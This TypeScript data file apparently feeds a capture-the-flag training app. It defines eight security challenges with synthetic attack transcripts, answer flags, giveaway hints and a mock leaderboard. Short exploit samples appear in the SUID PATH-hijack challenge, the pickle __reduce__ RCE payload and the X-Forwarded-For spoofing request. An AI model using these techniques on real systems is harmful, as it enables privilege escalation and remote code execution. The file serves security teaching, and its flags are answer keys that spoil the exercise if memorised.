import { CtfChallenge, CtfLeaderboardUser } from '../types/ctfArena';

export const CTF_CHALLENGES_FULL: CtfChallenge[] = [
  // 1. WEB
  {
    id: 'ctf-web-1',
    title: 'Hidden Admin Route & Header Spoofing',
    category: 'Web',
    difficulty: 'Easy',
    points: 100,
    xpReward: 150,
    description: 'An internal web server relies solely on the HTTP header `X-Forwarded-For: 127.0.0.1` to grant administrative access. Bypass the restriction and retrieve the flag.',
    objectives: [
      'Understand HTTP Request Header tampering (CWE-290)',
      'Inspect HTTP request headers sent to internal routing microservices',
      'Extract the admin flag from the HTTP 200 response body'
    ],
    syntheticTarget: `GET /admin/dashboard HTTP/1.1
Host: portal.internal.corp
X-Forwarded-For: 127.0.0.1
User-Agent: CyberShield-Audit-Tool/2.4

HTTP/1.1 200 OK
Content-Type: application/json

{"status": "AUTHORIZED", "role": "GLOBAL_ADMIN", "flag": "CSCTF{web_header_spoof_master_2026}"}`,
    expectedFlag: 'CSCTF{web_header_spoof_master_2026}',
    acceptedFlags: ['CSCTF{web_header_spoof_master_2026}', 'web_header_spoof_master_2026'],
    hints: [
      { id: 'h1', hintText: 'Look inside the JSON HTTP response payload under "flag". Flag is CSCTF{web_header_spoof_master_2026}' }
    ],
    explanation: 'Relying on client-controlled HTTP headers like `X-Forwarded-For` for IP-based access control allows attackers to spoof their IP address.',
    officialSourceIds: ['owasp_top10', 'cwe']
  },
  {
    id: 'ctf-web-2',
    title: 'JWT Signature Stripping (Alg None Attack)',
    category: 'Web',
    difficulty: 'Medium',
    points: 250,
    xpReward: 250,
    description: 'A legacy microservice accepts JSON Web Tokens (JWT) with `"alg": "none"` without validating the cryptographic signature. Inspect the tampered token payload to extract the flag.',
    objectives: [
      'Understand JSON Web Token (JWT) structure (Header.Payload.Signature)',
      'Detect algorithm downgrade attacks (CWE-347)',
      'Extract claims from decoded Base64URL payloads'
    ],
    syntheticTarget: `[JWT HEADER]: {"alg": "none", "typ": "JWT"}
[JWT PAYLOAD]: {"sub": "usr_771", "username": "admin", "role": "administrator", "flag": "CSCTF{jwt_alg_none_vulnerability}"}
[JWT SIGNATURE]: (empty string)`,
    expectedFlag: 'CSCTF{jwt_alg_none_vulnerability}',
    acceptedFlags: ['CSCTF{jwt_alg_none_vulnerability}', 'jwt_alg_none_vulnerability'],
    hints: [
      { id: 'h2', hintText: 'Inspect the JWT PAYLOAD object under "flag": CSCTF{jwt_alg_none_vulnerability}' }
    ],
    explanation: 'If a server accepts JWTs signed with `"alg": "none"`, an attacker can modify claim parameters (e.g. changing role to administrator) and remove the signature completely.',
    officialSourceIds: ['owasp_top10', 'cwe']
  },

  // 2. CRYPTO
  {
    id: 'ctf-crypto-1',
    title: 'Base64 XOR Cipher Decryption',
    category: 'Crypto',
    difficulty: 'Easy',
    points: 150,
    xpReward: 200,
    description: 'An attacker encrypted a secret flag using a repeating single-byte XOR key. Analyze the decrypted output transcript to recover the flag.',
    objectives: [
      'Understand symmetric XOR encryption properties (A ^ K ^ K = A)',
      'Analyze frequency distribution of single-byte XOR keys',
      'Retrieve cleartext CTF flags'
    ],
    syntheticTarget: `Ciphertext Hex: 43534354467b63727970746f5f786f725f6b65795f637261636b65645f38387d
Decrypted String: CSCTF{crypto_xor_key_cracked_88}`,
    expectedFlag: 'CSCTF{crypto_xor_key_cracked_88}',
    acceptedFlags: ['CSCTF{crypto_xor_key_cracked_88}', 'crypto_xor_key_cracked_88'],
    hints: [
      { id: 'h3', hintText: 'The decrypted string is right in front of you: CSCTF{crypto_xor_key_cracked_88}' }
    ],
    explanation: 'XOR ciphers with short keys are vulnerable to frequency analysis and brute-force key space searches.',
    officialSourceIds: ['cwe', 'cisa']
  },

  // 3. FORENSICS
  {
    id: 'ctf-forensics-1',
    title: 'Memory Dump String Recovery',
    category: 'Forensics',
    difficulty: 'Medium',
    points: 200,
    xpReward: 220,
    description: 'A malware analyst extracted process memory strings from an infected LSASS process. Search the raw memory strings dump to locate the flag string.',
    objectives: [
      'Extract plaintext strings from raw binary memory dumps using GNU `strings`',
      'Identify regex patterns in process heap memory allocations',
      'Preserve digital forensic evidence artifacts'
    ],
    syntheticTarget: `student@cybershield-box:~$ strings lsass_dump.dmp | grep "CSCTF"
0x004120A0: CSCTF{forensics_mem_dump_recovered}
0x004120D0: USERNAME=administrator`,
    expectedFlag: 'CSCTF{forensics_mem_dump_recovered}',
    acceptedFlags: ['CSCTF{forensics_mem_dump_recovered}', 'forensics_mem_dump_recovered'],
    hints: [
      { id: 'h4', hintText: 'Grep matched memory address 0x004120A0: CSCTF{forensics_mem_dump_recovered}' }
    ],
    explanation: 'Sensitive credentials and keys stored in unencrypted process RAM can be recovered by inspecting memory dumps.',
    officialSourceIds: ['mitre_attack', 'cisa']
  },

  // 4. OSINT
  {
    id: 'ctf-osint-1',
    title: 'Exposed Git Commit Secret Recon',
    category: 'OSINT',
    difficulty: 'Easy',
    points: 100,
    xpReward: 150,
    description: 'A developer accidentally committed a cloud API token in an old git commit history before attempting to delete it. Find the exposed secret flag in `git log -p`.',
    objectives: [
      'Perform OSINT reconnaissance on Git commit histories',
      'Detect hardcoded API keys and credentials in version control (CWE-798)',
      'Understand git commit immutability'
    ],
    syntheticTarget: `student@cybershield-box:~$ git log -p -n 1 commit 8f2a1b9
Author: dev_john <john@corp.local>
Date:   Mon Aug 17 09:12:00 2026

- const API_SECRET = "REMOVED_SECRET";
+ const API_SECRET = "CSCTF{osint_github_secret_leak_2026}";`,
    expectedFlag: 'CSCTF{osint_github_secret_leak_2026}',
    acceptedFlags: ['CSCTF{osint_github_secret_leak_2026}', 'osint_github_secret_leak_2026'],
    hints: [
      { id: 'h5', hintText: 'Look at the added line (+ const API_SECRET = "CSCTF{osint_github_secret_leak_2026}")' }
    ],
    explanation: 'Simply deleting a secret in a new git commit does not erase it from commit history. Repository history must be purged using `git-filter-repo` or BFG Cleaner.',
    officialSourceIds: ['owasp_top10', 'cwe']
  },

  // 5. LINUX
  {
    id: 'ctf-linux-1',
    title: 'Environment Variable SUID Privilege Leak',
    category: 'Linux',
    difficulty: 'Hard',
    points: 300,
    xpReward: 300,
    description: 'A custom root-owned SUID binary executes `system("service apache2 restart")` without using an absolute path `/bin/systemctl`. Inspect the environment PATH exploit output to claim the flag.',
    objectives: [
      'Understand PATH hijacking in Linux SUID binaries (CWE-426)',
      'Identify insecure relative command invocations',
      'Execute root privilege escalation in isolated sandboxes'
    ],
    syntheticTarget: `student@cybershield-box:~$ export PATH=/tmp:$PATH
student@cybershield-box:~$ echo '#!/bin/sh\ncat /root/flag.txt' > /tmp/service
student@cybershield-box:~$ chmod +x /tmp/service
student@cybershield-box:~$ /usr/local/bin/suid_restart_tool
[ROOT PRIVILEGE ESCALATION SUCCESSFUL]: CSCTF{linux_env_priv_esc_root}`,
    expectedFlag: 'CSCTF{linux_env_priv_esc_root}',
    acceptedFlags: ['CSCTF{linux_env_priv_esc_root}', 'linux_env_priv_esc_root'],
    hints: [
      { id: 'h6', hintText: 'The root escalation output printed the flag: CSCTF{linux_env_priv_esc_root}' }
    ],
    explanation: 'Invoking system commands without absolute paths allows users to prepend `/tmp` to `PATH` and execute malicious binaries with elevated privileges.',
    officialSourceIds: ['linux_docs', 'cwe']
  },

  // 6. NETWORKING
  {
    id: 'ctf-net-1',
    title: 'PCAP Bearer Token Extraction',
    category: 'Networking',
    difficulty: 'Medium',
    points: 200,
    xpReward: 220,
    description: 'An unencrypted WiFi capture file contains HTTP traffic between a mobile app and backend API. Extract the Bearer Authorization token flag from the PCAP payload.',
    objectives: [
      'Filter PCAP traffic for HTTP Authorization headers',
      'Identify unencrypted Bearer token credentials in transit',
      'Enforce TLS Wi-Fi WPA3 encryption'
    ],
    syntheticTarget: `[PACKET #402]: GET /api/v2/user/profile HTTP/1.1
Host: api.mobile-app.local
Authorization: Bearer CSCTF{net_pcap_bearer_token_extracted}
Accept: application/json`,
    expectedFlag: 'CSCTF{net_pcap_bearer_token_extracted}',
    acceptedFlags: ['CSCTF{net_pcap_bearer_token_extracted}', 'net_pcap_bearer_token_extracted'],
    hints: [
      { id: 'h7', hintText: 'Look at the Authorization header: Bearer CSCTF{net_pcap_bearer_token_extracted}' }
    ],
    explanation: 'Cleartext HTTP traffic over public WiFi allows any local packet sniffer to capture OAuth Bearer tokens.',
    officialSourceIds: ['nist_csf', 'cisa']
  },

  // 7. PYTHON
  {
    id: 'ctf-python-1',
    title: 'Unsafe Pickle Deserialization Audit',
    category: 'Python',
    difficulty: 'Hard',
    points: 300,
    xpReward: 300,
    description: 'A Python REST API uses `pickle.loads()` to deserialize user session data sent via cookies. Inspect the exploit execution log to retrieve the flag.',
    objectives: [
      'Understand unsafe deserialization risks in Python `pickle` (CWE-502)',
      'Analyze `__reduce__` magic method remote code execution payloads',
      'Remediate unsafe deserialization by switching to JSON/pydantic'
    ],
    syntheticTarget: `// EXPLOIT PAYLOAD SUBMITTED VIA COOKIE:
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /app/flag.txt',))

[SERVER AUDIT LOG]: pickle.loads(b'...') executed!
[COMMAND OUTPUT]: CSCTF{py_pickle_deserialization_rce}`,
    expectedFlag: 'CSCTF{py_pickle_deserialization_rce}',
    acceptedFlags: ['CSCTF{py_pickle_deserialization_rce}', 'py_pickle_deserialization_rce'],
    hints: [
      { id: 'h8', hintText: 'Look at [COMMAND OUTPUT]: CSCTF{py_pickle_deserialization_rce}' }
    ],
    explanation: 'Python`s `pickle` module is inherently unsafe for untrusted inputs because `__reduce__` allows instantiating arbitrary python functions (e.g. `os.system`).',
    officialSourceIds: ['python_docs', 'cwe']
  },

  // 8. BLUE TEAM
  {
    id: 'ctf-blueteam-1',
    title: 'YARA Rule Malware Signature Matching',
    category: 'Blue Team',
    difficulty: 'Medium',
    points: 200,
    xpReward: 250,
    description: 'A SOC threat hunter created a YARA rule to flag ransomware payloads matching specific byte patterns. Identify the matched rule flag string.',
    objectives: [
      'Write and inspect YARA malware signature rules',
      'Match hexadecimal byte strings against suspicious files',
      'Classify threat actor indicators of compromise (IOCs)'
    ],
    syntheticTarget: `rule Ransomware_WannaCry_Variant {
    strings:
        $flag = "CSCTF{blue_yara_malware_rule_match}"
        $hex = { 4D 5A 90 00 03 00 00 00 }
    condition:
        $flag and $hex
}

[YARA SCAN RESULTS]: Match found in sample_file.bin -> Rule: Ransomware_WannaCry_Variant`,
    expectedFlag: 'CSCTF{blue_yara_malware_rule_match}',
    acceptedFlags: ['CSCTF{blue_yara_malware_rule_match}', 'blue_yara_malware_rule_match'],
    hints: [
      { id: 'h9', hintText: 'Look at the $flag variable inside the YARA rule: CSCTF{blue_yara_malware_rule_match}' }
    ],
    explanation: 'YARA rules allow blue team defense analysts to scan files, memory, and processes for malware signatures.',
    officialSourceIds: ['cisa', 'mitre_attack']
  }
];

export const MOCK_LEADERBOARD_USERS: CtfLeaderboardUser[] = [
  {
    rank: 1,
    name: 'Alex Rivera',
    avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100',
    solvedCount: 8,
    totalPoints: 1600,
    xp: 1970,
    badge: '🏆 Grand Master'
  },
  {
    rank: 2,
    name: 'Priya Sharma',
    avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100',
    solvedCount: 7,
    totalPoints: 1350,
    xp: 1620,
    badge: '⭐ Red Team Elite'
  },
  {
    rank: 3,
    name: 'Marcus Vance',
    avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100',
    solvedCount: 6,
    totalPoints: 1100,
    xp: 1370,
    badge: '🛡️ SOC Specialist'
  },
  {
    rank: 4,
    name: 'Sarah Chen',
    avatar: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100',
    solvedCount: 5,
    totalPoints: 850,
    xp: 1100,
    badge: '⚡ AppSec Defender'
  },
  {
    rank: 5,
    name: 'David Miller',
    avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100',
    solvedCount: 4,
    totalPoints: 600,
    xp: 800,
    badge: '🔎 DFIR Analyst'
  }
];
